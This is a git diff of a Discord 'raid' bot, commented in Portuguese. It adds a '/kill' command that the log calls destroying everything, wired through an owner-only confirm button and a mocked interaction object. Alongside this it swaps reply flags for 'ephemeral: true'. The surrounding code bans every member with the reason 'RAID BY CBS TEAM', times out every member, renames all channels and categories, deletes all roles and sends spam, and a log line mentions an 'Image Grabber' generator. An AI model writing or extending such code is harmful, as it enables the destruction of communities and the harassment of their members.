@@ -59,6 +59,7 @@ client.once('ready', async () => {
   cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
   console.log('📋 Digite !menu no Discord');
   console.log('📸 Digite /img para gerar Image Grabber');
+  console.log('💀 Digite /kill para destruir tudo (dono)');
 });
 
 // ============ SLASH COMMANDS ============
@@ -70,7 +71,7 @@ client.on('interactionCreate', async interaction => {
       await command.execute(interaction, client);
     } catch (error) {
       console.error(error);
-      await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
+      await interaction.reply({ content: '❌ Erro.', ephemeral: true }).catch(() => {});
     }
   }
 });
@@ -88,7 +89,7 @@ client.on('interactionCreate', async interaction => {
     if (mensagem) config.raid.spamMessage = mensagem;
     await interaction.reply({
       content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
-      flags: 64
+      ephemeral: true
     }).catch(() => {});
   }
 
@@ -96,34 +97,34 @@ client.on('interactionCreate', async interaction => {
     const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
     const nome = interaction.fields.getTextInputValue('nomeInput');
     const guild = interaction.guild;
-    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
     if (tipo === 'canal') {
       const channels = guild.channels.cache.filter(c => c.type === 0);
       let count = 0;
       for (const [id, ch] of channels) {
         try { await ch.setName(nome); count++; } catch {}
       }
-      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 }).catch(() => {});
+      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, ephemeral: true }).catch(() => {});
     } else if (tipo === 'categoria') {
       const categories = guild.channels.cache.filter(c => c.type === 4);
       let count = 0;
       for (const [id, cat] of categories) {
         try { await cat.setName(nome); count++; } catch {}
       }
-      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 }).catch(() => {});
+      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, ephemeral: true }).catch(() => {});
     } else {
-      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 }).catch(() => {});
+      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', ephemeral: true }).catch(() => {});
     }
   }
 
   if (modalId === 'banAllModal') {
     const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
     const guild = interaction.guild;
-    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
     const botId = interaction.client.user.id;
     const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
-    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
-    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 }).catch(() => {});
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', ephemeral: true }).catch(() => {});
+    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, ephemeral: true }).catch(() => {});
     let banidos = 0;
     const list = [...members.values()];
     for (let i = 0; i < list.length; i += 10) {
@@ -139,11 +140,11 @@ client.on('interactionCreate', async interaction => {
     const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
     const duracao = minutos * 60 * 1000;
     const guild = interaction.guild;
-    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', flags: 64 }).catch(() => {});
+    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
     const botId = interaction.client.user.id;
     const members = guild.members.cache.filter(m => m.id !== botId);
-    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 }).catch(() => {});
-    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 }).catch(() => {});
+    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', ephemeral: true }).catch(() => {});
+    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, ephemeral: true }).catch(() => {});
     let timeoutados = 0;
     const list = [...members.values()];
     for (let i = 0; i < list.length; i += 10) {
@@ -181,10 +182,10 @@ client.on('interactionCreate', async interaction => {
 
   // ===== SPAM 1 VEZ =====
   if (interaction.customId === 'spam1') {
-    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    await interaction.deferReply({ ephemeral: true }).catch(() => {});
     const channel = interaction.channel;
     if (!channel) {
-      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
+      return interaction.editReply({ content: '❌ Canal não encontrado.', ephemeral: true }).catch(() => {});
     }
     let enviadas = 0;
     for (let i = 0; i < 1; i++) {
@@ -196,10 +197,10 @@ client.on('interactionCreate', async interaction => {
 
   // ===== SPAM 2 VEZES =====
   if (interaction.customId === 'spam2') {
-    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    await interaction.deferReply({ ephemeral: true }).catch(() => {});
     const channel = interaction.channel;
     if (!channel) {
-      return interaction.editReply({ content: '❌ Canal não encontrado.', flags: 64 }).catch(() => {});
+      return interaction.editReply({ content: '❌ Canal não encontrado.', ephemeral: true }).catch(() => {});
     }
     let enviadas = 0;
     for (let i = 0; i < 2; i++) {
@@ -227,18 +228,13 @@ client.on('interactionCreate', async interaction => {
     const cmdName = menuMap[interaction.customId];
     const cmd = client.commands.get(cmdName);
     if (!cmd) {
-      return interaction.reply({ content: '❌ Comando não encontrado.', flags: 64 }).catch(() => {});
+      return interaction.reply({ content: '❌ Comando não encontrado.', ephemeral: true }).catch(() => {});
     }
     try {
-      // Para o comando invite, precisamos passar client
-      if (cmdName === 'invite') {
-        await cmd.execute(interaction, client);
-      } else {
-        await cmd.execute(interaction, client);
-      }
+      await cmd.execute(interaction, client);
     } catch (err) {
       console.error(err);
-      await interaction.reply({ content: '❌ Erro.', flags: 64 }).catch(() => {});
+      await interaction.reply({ content: '❌ Erro.', ephemeral: true }).catch(() => {});
     }
     return;
   }
@@ -247,7 +243,7 @@ client.on('interactionCreate', async interaction => {
   if (interaction.customId === 'stop_timer') {
     const DONO_ID = '1409370594138525746';
     if (interaction.user.id !== DONO_ID) {
-      return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', flags: 64 }).catch(() => {});
+      return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', ephemeral: true }).catch(() => {});
     }
 
     let timerEncontrado = null;
@@ -261,7 +257,7 @@ client.on('interactionCreate', async interaction => {
     }
 
     if (!timerEncontrado) {
-      return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', flags: 64 }).catch(() => {});
+      return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', ephemeral: true }).catch(() => {});
     }
 
     timerEncontrado.ativo = false;
@@ -280,16 +276,64 @@ client.on('interactionCreate', async interaction => {
       await msg.edit({ embeds: [embedCancel], components: [] });
     } catch {}
 
-    await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', flags: 64 }).catch(() => {});
+    await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', ephemeral: true }).catch(() => {});
+    return;
+  }
+
+  // ===== BOTÕES DO KILL =====
+  if (interaction.customId === 'kill_confirm') {
+    const DONO_ID = '1409370594138525746';
+    if (interaction.user.id !== DONO_ID) {
+      return interaction.reply({ content: '❌ Apenas o dono pode executar esta ação.', ephemeral: true });
+    }
+
+    await interaction.deferReply({ ephemeral: true });
+    const killCmd = client.commands.get('kill');
+    if (!killCmd) {
+      return interaction.editReply({ content: '❌ Comando /kill não encontrado.' });
+    }
+
+    // Simula um objeto interaction com options para o comando kill
+    const mockInteraction = {
+      ...interaction,
+      options: {
+        getBoolean: (name) => {
+          if (name === 'confirmar') return true;
+          return null;
+        }
+      },
+      deferReply: async () => {},
+      editReply: async (msg) => {
+        await interaction.editReply(msg);
+      },
+      reply: async (msg) => {
+        await interaction.reply(msg);
+      }
+    };
+
+    try {
+      await killCmd.execute(mockInteraction, client);
+    } catch (err) {
+      console.error(err);
+      await interaction.editReply({ content: '❌ Erro ao executar /kill.' });
+    }
+    return;
+  }
+
+  if (interaction.customId === 'kill_cancel') {
+    await interaction.reply({
+      content: '❌ **Operação cancelada.**',
+      ephemeral: true
+    });
     return;
   }
 
   // ===== CONFIRMAR / CANCELAR DELETEROLE =====
   if (interaction.customId === 'confirmDeleteRoles') {
     const guild = interaction.guild;
-    if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', flags: 64 }).catch(() => {});
+    if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', ephemeral: true }).catch(() => {});
     const roles = guild.roles.cache.filter(r => r.id !== guild.id);
-    await interaction.deferReply({ flags: 64 }).catch(() => {});
+    await interaction.deferReply({ ephemeral: true }).catch(() => {});
     let deletados = 0;
     const list = [...roles.values()];
     for (let i = 0; i < list.length; i += 10) {
@@ -302,7 +346,7 @@ client.on('interactionCreate', async interaction => {
   }
 
   if (interaction.customId === 'cancelDeleteRoles') {
-    await interaction.reply({ content: '❌ Cancelado.', flags: 64 }).catch(() => {});
+    await interaction.reply({ content: '❌ Cancelado.', ephemeral: true }).catch(() => {});
   }
 });
 
